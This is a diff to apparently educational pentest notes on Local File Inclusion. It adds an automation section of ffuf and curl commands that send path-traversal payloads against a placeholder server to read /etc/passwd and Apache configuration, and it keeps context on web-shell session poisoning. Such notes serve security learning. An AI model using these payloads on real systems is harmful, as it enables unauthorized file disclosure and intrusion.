@@ -22,10 +22,14 @@
 	* [Log Poisoning](#log-poisoning)
 		* [PHP Session Poisoning](#php-session-poisoning)
 		* [Server Log Poisoning](#server-log-poisoning)
+* [Automation](#automation)
 * [Read, Write and Execute Functions](#read-write-and-execute-functions)
-
 > [!Important]
 > [LFI Wordlist](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)
+> [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) Contains various bypasses.
+> Common web root paths:
+> - [wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt)
+> - [wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt)
 
 ---
 ## Overview
@@ -248,7 +252,8 @@ For this attack to work, We should have read privileges over the logged files an
 	......page|s:30:"uid=33(www-data) gid=33(www-data) groups=33(www-data),4(adm)";preference|s:7:"Spanish";.....[SNIP]
 	```
 
-> [!Note] To execute another command, the session file has to be poisoned with the web shell again, as it gets overwritten after every inclusion.
+> [!Note]
+> To execute another command, the session file has to be poisoned with the web shell again, as it gets overwritten after every inclusion.
 #### Server Log Poisoning
 - `access.log` and `error.log`.
 	- `Nginx` readable by low privileged users by default. 
@@ -276,6 +281,56 @@ For this attack to work, We should have read privileges over the logged files an
 		- `/var/log/vsftpd.log`
 	- We can send an email containing PHP code, and upon its log inclusion, the PHP code would execute.
 		- `/var/log/mail`
+---
+## Automation
+1. Fuzz for parameters (fuzz for `GET`/`POST`)
+Identify exposed parameters that are not linked to any forms we tested manually.
+``` bash
+$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
+language                    [Status: xxx, Size: xxx, Words: xxx, Lines: xxx]
+```
+2. Fuzz the parameter values with LFI wordlists. (e.g. [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt))
+``` bash
+$ ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
+../../../../etc/passwd  [Status: 200, Size: 3661, Words: 645, Lines: 91]
+../../../../../etc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
+../../../../../../etc/passwd&=%3C%3C%3C%3C [Status: 200, Size: 3661, Words: 645, Lines: 91]
+```
+3. Server Webroot
+	- [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt)
+	- [wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt)
+	- [wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt)
+``` bash
+$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
+/var/www/html/          [Status: 200, Size: 0, Words: 1, Lines: 1]
+```
+4. Server Logs/Configurations
+	- [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) 
+	- [wordlist for Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux)
+	- [wordlist for Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows)
+``` bash
+$ ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
+/etc/apache2/apache2.conf [Status: 200, Size: 9511, Words: 1575, Lines: 292]
+/etc/apache2/envvars    [Status: 200, Size: 4069, Words: 823, Lines: 112]
+....[SNIP].....
+```
+> Read some configuration
+``` bash
+$ curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf
+...SNIP...
+        ServerAdmin webmaster@localhost
+        DocumentRoot /var/www/html
+        ErrorLog ${APACHE_LOG_DIR}/error.log
+        CustomLog ${APACHE_LOG_DIR}/access.log combined
+...SNIP...
+$ curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars
+...SNIP...
+# Only /var/log/apache2 is handled by /etc/logrotate.d/apache2.
+export APACHE_LOG_DIR=/var/log/apache2$SUFFIX
+...SNIP...
+```
+The most common LFI tools are [LFISuite](https://github.com/D35m0nd142/LFISuite), [LFiFreak](https://github.com/OsandaMalith/LFiFreak), and [liffy](https://github.com/mzfr/liffy).
+
 ---
 ## Read, Write and Execute Functions
 
